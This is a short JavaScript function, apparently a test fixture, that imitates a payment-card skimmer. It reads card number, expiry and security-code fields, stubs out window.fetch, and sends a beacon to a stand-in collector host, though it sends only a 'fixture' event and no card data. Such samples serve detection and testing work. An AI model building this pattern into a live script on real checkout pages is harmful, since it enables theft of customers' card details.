function inspectNetworkAndInputs(window, navigator, input, preview) {
  let number, expiration, code;
  if (input.autocomplete === 'cc-number') number = preview;
  if (input.autocomplete === 'cc-exp') expiration = preview;
  if (input.autocomplete === 'cc-csc') code = preview;
  window.fetch = function () { return null; };
  if (!/^\d{3,4}$/.test(code)) return;
  navigator.sendBeacon('https://collector.example.invalid/preview', new URLSearchParams({event: 'fixture'}));
}
